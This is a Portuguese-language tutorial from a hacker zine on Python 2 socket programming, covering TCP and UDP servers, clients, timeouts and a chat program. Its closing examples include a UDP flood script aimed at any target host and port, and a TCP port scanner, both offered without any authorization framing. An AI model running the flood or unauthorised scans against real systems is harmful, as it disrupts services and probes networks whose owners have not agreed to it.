@@ -1,0 +1,687 @@
+############################################################################
+#                   Security Darkers                                       #
+#                     Darkers Zine                                         #
+#Membros:_Dr4k0_,Storm,gbr,nibbles,OnlyOne,Sthealt,Dark_Side,Fylhoth,rog   #
+#Autor:Dark_Side                                                           #
+#Contato: wWw.darkers.com.br/smf                                           #
+#                                                                          #
+#                                                                          #
+############################################################################
+
+                         Sockets em Python
+
+1.  Introdução
+2.  Criando um socket em Python
+3.  Sockets - um programa servidor
+4.  Sockets - um programa cliente
+5.  Enviando e recebendo dados
+6.  Fechando um socket
+7.  Sockets com o protocolo UDP
+8.  Algumas funções relacionadas a sockets
+9.  Exemplos de uso
+10. Finalizando
+
+===================================================================================
+                                  Introdução
+===================================================================================
+
+Trabalhar com sockets em Python é uma tarefa extremamente fácil e simples.
+Outra vantagem é que o código necessário para tal, é bem enxuto e de fácil
+compreensão. No entanto, a simplicidade não torna a programação de sockets
+pouco produtiva, aliás, é possível desenvolver aplicativos poderosos rapidamente.
+
+===================================================================================
+                              Criando um socket em Python
+===================================================================================
+
+A criação de um socket em Python pode ser feita da seguinte maneira:
+
+-----------------------------------------------------------------------
+import socket # Importa o módulo do socket
+import sys # para usar sys.exit()
+try:
+  sock = socket.socket(FAMÍLIA,TIPO,PROTOCOLO)
+except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1) # Encerra
+-----------------------------------------------------------------------
+
+Para utilizarmos sockets em Python, precisamos importar o módulo necessário - socket.
+
+Vejamos os parâmetros:
+
+ FAMÍLIA: define a família do socket, que pode ser:
+
+       AF_UNIX =>  família de protocolo UNIX ; Necessita de constante definida
+       AF_INET =>  família INTERNET ; IPV4
+       AF_INET6 => família INTERNET ; IPV6
+
+ TIPO: define o tipo de socket;
+
+   Os principais:
+      SOCK_STREAM => TCP
+      SOCK_DGRAM => UDP
+      SOCK_RAW => RAW Socket
+
+ PROTOCOLO: define os argumentos para o uso do protocolo, geralmente é definido como 0.
+
+Veja abaixo a criação de um socket em si:
+
+-----------------------------------------------------------------------
+import socket
+import sys # sys.exit()
+try:
+  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
+except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1) # Encerra
+-----------------------------------------------------------------------
+
+Acima estamos associando a variável "sock" ao nosso socket. As constantes utilizadas
+(AF_INET e SOCK_STREAM), necessitam do prefixo "socket." uma vez em que fazem parte
+da classe de sockets.
+
+As instruções try e except, são utilizas para tratar de exceções geradas pelo programa.
+Estas exceções são geralmente erros que ocorrem em tempo de execução do programa, tendo
+que ser tratadas. A classe "socket.error" é utilizada para tratar erros de socket.
+
+ Sintaxe:
+
+try:
+  # instruções iniciais
+except <CLASSE>: # CLASSE = classe do erro a ser tratado
+  # instruções de tratamento dos possíveis erros gerados
+
+===================================================================================
+                            Sockets - um programa servidor
+===================================================================================
+
+Para criamos um socket e o configurar como servidor, devemos especificar a porta em
+que este irá aguardar e receber conexões. Vejamos:
+
+-----------------------------------------------------------------------
+import socket
+import sys
+try:
+  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0) # Tenta criar o socket
+except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1)
+
+porta = 1234 # Porta utilizada
+try:
+   sock.bind(("",porta)) # Configura o socket na porta local
+   sock.listen(1) #  Aguarda 1 conexão
+except socket.error:
+   print "Erro ao configurar socket na porta local"
+   sys.exit(1)
+
+sock,addr = sock.accept() # Aceita uma conexão
+print "Conexao vinda de: " + str(addr[0]) + "\nPorta: " + str(addr[1])
+sock.close()
+-----------------------------------------------------------------------
+
+Vejamos:
+
+porta = 1234
+Definimos a porta em que o socket deverá receber conexões
+
+try:
+   sock.bind(("",porta))
+   sock.listen(1)
+except socket.error:
+   print "Erro ao configurar socket na porta local"
+   sys.exit(1)
+
+Tentamos configurar o socket na porta local com o método bind():
+
+Sintaxe:
+  sock.bind((HOST,Porta))
+
+   sock:
+      nome atribuído ao socket;
+
+   HOST:
+      hostname local, o parâmetro pode estar vazio;
+
+   Porta:
+      porta local.
+
+O método listen() é utilizado para colocar o socket em modo de espera.
+
+Sintaxe:
+  sock.listen(num)
+
+   sock:
+      nome atribuído ao socket;
+
+   num:
+      número de conexões que o socket poderá receber.
+
+No nosso exemplo, o socket iria aguardar 1 conexão na porta 1234.
+
+sock,addr = sock.accept()
+
+Aguarda até que um pedido de conexão seja feito. Quando este é feito,
+a conexão é associada ao socket atribuído.
+
+Sintaxe:
+  novosock,addr = sock.accept()
+
+   novosock:
+      nome do socket que terá a conexão atrubuída, pode ser o mesmo socket criado;
+
+   addr:
+      array que irá armazenar o HOST e PORTA do computador remoto conectado.
+
+print "Conexao vinda de: " + str(addr[0]) + "\nPorta: " + str(addr[1])
+
+Em Python, os valores de um array são acessados da seguinte forma:
+
+array[0] = primeiro elemento;
+array[1] = segundo elemento;
+array[2] = terceiro elemento.
+....
+
+No array "addr":
+
+addr[0] = HOST do computador remoto;
+addr[1] = Porta do computador remoto.
+
+Note que utilizamos a função auxiliar str() para converter os valores para string,
+e só assim, concatenar os valores.
+
+sock.close()
+Fecha o socket.
+
+===================================================================================
+                            Sockets - um programa cliente
+===================================================================================
+
+Para conectar a um host, utilizamos o método connect().
+
+Sintaxe:
+  sock.connect((HOST,PORTA))
+
+     sock:
+        nome atribuído ao socket;
+
+     HOST:
+        Hostname ou IP a se conectar;
+
+     Porta:
+        Porta utilizada na conexão.
+
+Exemplo:
+
+-----------------------------------------------------------------------
+import socket
+import sys
+try:
+  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
+except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1) # Encerra
+
+servidor = "www.servidor.com"
+porta = 1234
+
+try:
+   sock.connect((servidor,porta))
+except socket.error:
+   print "Erro ao conectar em: " + servidor
+   sys.exit(1)
+print "Conectado!"
+-----------------------------------------------------------------------
+
+Vejamos:
+
+servidor = "www.servidor.com"
+porta = 1234
+
+sock.connect((servidor,porta))
+
+Tentamos nos conectar ao servidor pela porta 1234.
+Definimos o servidor a se conectar, e a porta (1234).
+Utilizamos a instrução try, para validar se houve conexão ou não.
+
+===================================================================================
+                               Enviando e recebendo dados
+===================================================================================
+
+Após termos uma conexão estabelecida (no caso do protocolo TCP), podemos enviar
+e receber dados.
+
+Enviando dados:
+
+ sock.send(DADOS)
+
+ sock:
+      nome atribuído ao socket;
+
+ DADOS:
+      dados que serão enviados.
+
+A função retorna a quantidade de bytes enviados;
+
+Recebendo dados:
+
+ buffer = sock.recv(tam)
+
+ buffer:
+      variável que irá armazenar os dados recebidos;
+
+ sock:
+      nome atribuído ao socket;
+
+ tam:
+     número máximo de bytes que podem recebidos.
+
+A função retorna os dados recebidos.
+
+===================================================================================
+                               Fechando um socket
+===================================================================================
+
+Fechar um socket é uma tarefa bem simples:
+
+Sintaxe: sock.close()
+
+ sock:
+     nome atribuído ao socket;
+
+===================================================================================
+                            Sockets com o protocolo UDP
+===================================================================================
+
+Trabalhar com sockets sob o protocolo UDP é uma tarefa tão simples quanto trabalhar
+com o protocolo TCP. Uma vez em que o UDP não é um protocolo orientado a conexão,
+isto é, não depende de uma conexão estabelecida para enviar e receber dados, é ainda
+mais simples utilizar este protocolo.
+
+Vejamos:
+
+-----------------------------------------------------------------------
+import socket
+import sys
+try:
+  sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,0)
+except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1) # Encerra
+
+porta = 1234
+try:
+   sock.bind(("",porta))
+except socket.error:
+   print "Erro ao configurar socket na porta local"
+   sys.exit(1)
+
+buffer = sock.recvfrom(1024)
+print "Dados recebidos: " + str(buffer[0])
+print "IP remoto: " + str(buffer[1][0])
+print "Porta remota: " + str(buffer[1][1])
+sock.close()
+-----------------------------------------------------------------------
+
+Temos um simples exemplo de um servidor em UDP. O programa configura o socket na porta
+1234, e quando recebe os primeiros dados, os mostra e fecha o socket.
+
+Um detalhe a ser observado é a linha:
+
+sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,0)
+
+Utilizamos "socket.SOCK_DGRAM" para especificar o protocolo UDP.
+
+Temos ainda outra função sock.recvfrom().
+
+Sintaxe:
+
+ buffer = sock.recvfrom(tam)
+
+ buffer:
+      array que armazenará: os dados recebidos, o ip e porta do computador remoto;
+
+ sock:
+      nome atribuído ao socket;
+
+ tam:
+     número de bytes que serão recebidos.
+
+No caso,
+
+buffer[0] = dados recebidos;
+buffer[1][0] = host do computador remoto;
+buffer[1][1] = porta remota.
+
+Outro exemplo:
+
+-----------------------------------------------------------------------
+import socket
+import sys
+try:
+  sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,0)
+except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1) # Encerra
+
+servidor = "www.servidor.com"
+porta = 1234
+
+sock.sendto("Hello!",(servidor,porta))
+sock.close()
+-----------------------------------------------------------------------
+
+O programa acima simplesmente enviaria string "Hello!" para o servidor na porta 1234.
+
+A sintaxe seria:
+
+ sock.sendto(dados,(HOST,PORTA))
+
+   sock:
+      nome atribuído ao socket;
+
+   dados:
+      dados que serão enviados;
+
+   HOST:
+      host do servidor;
+
+   PORTA:
+      porta do servidor.
+
+Algumas observações sobre os protocolos:
+
+TCP:
+
+Orientado a conexão;
+Se o pacote não for entregue, ele será retransmitido;
+Apresenta maior segurança em transmissões de dados.
+
+UDP:
+
+Não orientado a conexão;
+Não há garantia da entrega de pacotes;
+Apresenta menor segurança em transmissões de dados.
+
+===================================================================================
+                       Algumas funções relacionadas a sockets
+===================================================================================
+
+Existem diversas funções que auxiliam a programação de sockets em Python,
+algumas delas são de enorme utilidade quando se deseja otimizar o programa.
+
+gethostbyname() => resolve um host e retorna seu IP.
+
+Sintaxe:
+
+ ip = socket.gethostbyname(hostname)
+
+      ip:
+        variável que irá receber o IP do host;
+
+      hostname:
+        host name a resolver;
+
+Exemplo:
+
+-----------------------------------------------------------------------
+import socket
+try:
+  ip = socket.gethostbyname("www.goo2gle.com.br")
+  print "IP: " + str(ip)
+except socket.error:
+  print "Erro ao resolver host"
+
+-----------------------------------------------------------------------
+O programa tentaria resolver o host: "www.google.com.br" e retornar o seu respectivo
+IP.
+
+getservbyport() => retorna o serviço associado a uma porta e um protocolo;
+
+Sintaxe:
+
+ servico = socket.getservbyport(porta,protocolo)
+
+     servico:
+          variável que irá receber o serviço retornado;
+
+     porta:
+         porta em que o serviço roda;
+
+     protocolo:
+         protocolo em que roda o serviço: tcp ou udp.
+
+Exemplo:
+
+-----------------------------------------------------------------------
+import socket
+porta = int(raw_input("Digite a porta: "))
+try:
+  serv = socket.getservbyport(porta,"tcp")
+  print "Servico: " + str(serv)
+except socket.error:
+  print "Porta desconhecida"
+
+-----------------------------------------------------------------------
+O programa acima receberia a entrada de uma porta, tentaria obter
+o serviço associado a esta e mostrá-lo.
+
+Por padrão, os sockets criados em Python estão definidos como Blocking. Isso significa
+que enquanto o socket estiver recebendo dados por exemplo, ele não poderá enviar.
+Por um lado, isso pode ser útil quando se deseja que efetivamente uma ação seja concluída,
+antes que outra seja iniciada, por outro lado, o tempo gasto para isso pode ser significativo.
+Em Python, temos duas funções interessantes que nos permite a controlar o modo pelo qual
+o socket irá trabalhar. São elas:
+
+settimeout() => define o tempo máximo que o socket deve levar para concluir uma operação.
+
+Sintaxe:
+
+   sock.settimeout(valor)
+
+ sock:
+      nome atribuído ao socket;
+
+ valor:
+     intervalo em segundos.
+
+Exemplo:
+
+-----------------------------------------------------------------------
+import socket
+import sys
+try:
+  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
+except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1)
+
+porta = 1234
+try:
+   sock.bind(("",porta))
+   sock.listen(1)
+except socket.error:
+   print "Erro ao configurar socket na porta local"
+   sys.exit(1)
+
+sock.settimeout(10)
+try:
+ sock,addr = sock.accept()
+ print "Conexao vinda de: " + str(addr[0]) + "\nPorta: " + str(addr[1])
+except socket.error:
+ sock.close()
+ print "Tempo esgotado"
+-----------------------------------------------------------------------
+No exemplo acima, o socket irá aguardar uma conexão na porta 1234.
+Porém, existe um tempo limite para que uma conexão ocorra: 10 segundos.
+Isso foi especificado pela função "sock.settimeout(10)".
+
+É importante visar que, quando o tempo limite é esgotado, o programa gera uma exceção
+que deve se tratada com try e except.
+
+Podemos ainda permitir que o socket realize diversas ações simultaneamente,
+podendo enviar e receber dados sem que uma ação seja conclúida previamente.
+Para isso, precisamos defini-lo no modo Non-Blocking, com a função setblocking();
+
+Sintaxe:
+
+ sock.setblocking(modo)
+
+ sock:
+      nome atribuído ao socket;
+
+ modo:
+     Se 0, o socket é definido como Non-Blocking, se diferente de 0, blocking.
+
+Abaixo, segue exemplos.
+
+===================================================================================
+                                Exemplos de uso
+===================================================================================
+
+Abaixo temos alguns exemplos de programas que utilizam sockets:
+
+Exemplo 1 - Programa Chat
+
+servidor.py
+-----------------------------------------------------------------------
+import socket
+import sys
+try:
+  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
+except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1) # Encerra
+
+porta = 1234
+try:
+   sock.bind(("",porta))
+   sock.listen(1)
+except socket.error:
+   print "Erro ao configurar socket na porta local"
+   sys.exit(1)
+
+sock,addr = sock.accept()
+print "Cliente conectado: " + str(addr[0]) + "\n"
+
+while 1: # Loop infinito
+ try:
+  env = raw_input(">> ") # Pede a entrada de dados a enviar
+  sock.send(env) # Envia-os
+  buffer = sock.recv(1024) # recebe dados
+  print "<< " + str(buffer) # mostra-os
+ except socket.error: # Em caso de erro ao enviar ou receber
+  print "A conexao foi interrompida!"
+  sys.exit(1) # Encerra
+sock.close()
+-----------------------------------------------------------------------
+
+cliente.py
+-----------------------------------------------------------------------
+import socket
+import sys
+
+servidor = raw_input(">> Servidor: ") # Obtém o host do servidor
+porta = 1234
+
+try:
+  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
+except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1) # Encerra
+
+try:
+   sock.connect((servidor,porta))  # Tenta se conectar
+except socket.error:
+   print "Erro ao se conectar em: " + str(servidor)
+   sys.exit(1)
+
+print "Conectado!\n"
+
+while 1: # Loop infinito
+ try:
+  buffer = sock.recv(1024) # recebe dados
+  print "<< " + str(buffer) # mostra-os
+  env = raw_input(">> ") # pede entrada de dados
+  sock.send(env) # envia-os
+ except socket.error: # Em caso de erro ao enviar ou receber
+  print "A conexao foi interrompida!"
+  sys.exit(1) # Encerra
+
+sock.close() # fecha socket
+
+-----------------------------------------------------------------------
+
+Exemplo 2: UDP FLOOD
+
+flood.py
+-----------------------------------------------------------------------
+
+import socket
+import sys
+
+servidor = raw_input(">> Alvo: ") # Pergunta pelo host
+porta = int(raw_input(">> Porta: "))  # Porta
+num = int(raw_input(">> Pacotes: ")) # número de pacotes
+
+try:
+  sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,0)
+except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1) # Encerra
+
+sock.setblocking(0) # Define o socket como nonblocking
+
+x = 1;
+
+while x <= num: # Enquanto x for menor que o número de pacotes
+   sock.sendto("XXXXXXXXXXXXXXXXXXXXXX",((servidor,porta))) # Envia o pacote
+   print "Enviando pacote " + str(x) + " de " + str(num)    # mostra status
+   x = x+1 # Incrementa x
+
+sock.close() # fecha socket
+-----------------------------------------------------------------------
+
+Exemplo 3: PORT SCANNER
+
+scan.py
+-----------------------------------------------------------------------
+
+import socket
+import sys
+
+servidor = raw_input(">> Host: ") # Pergunta pelo host
+inicial = int(raw_input(">> Porta inicial: "))  # Porta inicial
+final = int(raw_input(">> Porta final: ")) # Porta final
+
+for x in range(inicial,final+1): # De porta inicial até porta final
+ try:
+  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0) # Tenta criar socket
+ except socket.error:
+  print "Erro ao criar o socket"
+  sys.exit(1) # Encerra
+
+ sock.settimeout(2) # Define tempo máximo de espera = 2 segundos
+ servico = ""
+ print  "Escaneando: "  + str(x) # Mostra porta em escaneamento
+ try:
+   sock.connect((servidor,x))  # Tenta se conectar => porta aberta
+   servico =  socket.getservbyport(x,"tcp")  # Obtem servico da porta
+   print "Porta aberta: " + str(x) + " (" + str(servico) + ")" # Mostra a porta e seu respectivo servico
+ except socket.error:
+     sock.close()
+
+ sock.close() # Fecha o socket
+-----------------------------------------------------------------------
+
+===================================================================================
+                                Finalizando
+===================================================================================
+
+Termino aqui esse tutorial básico sobre sockets em Python. Espero que tenha ajudado
+e que fique um pouco mais claro o uso de sockets na linguagem Python, tendo uma base
+para o desenvolvimento de futuras aplicações.
+
+Carry on...
+Bye...
